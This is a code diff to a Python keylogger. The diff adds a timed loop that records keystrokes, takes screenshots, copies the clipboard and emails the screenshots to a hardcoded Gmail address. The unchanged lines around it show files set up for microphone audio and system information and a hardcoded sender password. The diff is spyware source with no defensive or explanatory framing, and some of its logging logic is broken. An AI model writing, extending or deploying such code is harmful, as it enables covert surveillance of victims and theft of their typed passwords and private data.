@@ -30,6 +30,8 @@ keys_information="key_log.txt"
 system_information="systeminfo.txt"
 clipboard_information="clipboard.txt"
 microphone_time= 10
+time_iteration=15
+number_of_iteration_end=3
 audio_info="audio.wav"
 ss_info="screenshot.png"
 
@@ -41,7 +43,7 @@ password="#Password123"
 toaddr = "lowdee1234@gmail.com"
 
 
-file_path="C:\\Users\\Admin\\Downloads\\New folder\\pyproj.py"
+file_path="C:\\Users\\Admin\\Downloads\\newfolder"
 extend = "\\"
 
 def send_email(filename,attachment,toaddr):
@@ -124,30 +126,57 @@ def ss():
     im.save(file_path+extend+ss_info)
 
 ss()
-count=0
-keys=[]
+number_of_iteration=0
+currentTime=time.time()
+stoppingTime=time.time()+time_iteration
 
-def on_press(key):
-    global keys,count
+while number_of_iteration<number_of_iteration_end:
+    
+    count=0 
+    keys=[]
 
-    print(key)
-    keys.append(key)
-    count+=1
+    def on_press(key):
+        global keys,count,currentTime
 
-def write_file(key):
-    with open(file_path+extend+keys_information, "a") as f:
-        for key in keys:
-            k=str(key).replace("'","")
-            if k.find("space") >0:
-                f.write('\n')
-                f.close()
-
-
-def on_release(key):
-    if key==Key.esc:
-        return False
-
-with Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
+        print(key)
+        keys.append(key)
+        count+=1
+        currentTime=time.time()
 
 
+        if count >=1:
+            count=0
+            write_file(keys)
+            keys=[]
+
+    def write_file(key):
+        with open(file_path+extend+keys_information, "a") as f:
+            for key in keys:
+                k=str(key).replace("'","")
+                if k.find("space") >0:
+                    f.write('\n')
+                    f.close()
+
+
+    def on_release(key):
+        if key==Key.esc:
+            return False
+        if currentTime>stoppingTime:
+            return False
+
+    with Listener(on_press=on_press,on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime>stoppingTime:
+        with open(file_path+extend+keys_information,"w") as f:
+            f.write(" ")
+
+        ss()
+        send_email(ss_info,file_path+extend+ss_info,toaddr)
+        copy_clipboard()
+        number_of_iteration+=1
+
+        currentTime=time.time()
+        stoppingTime=time.time()+time_iteration
+
+        
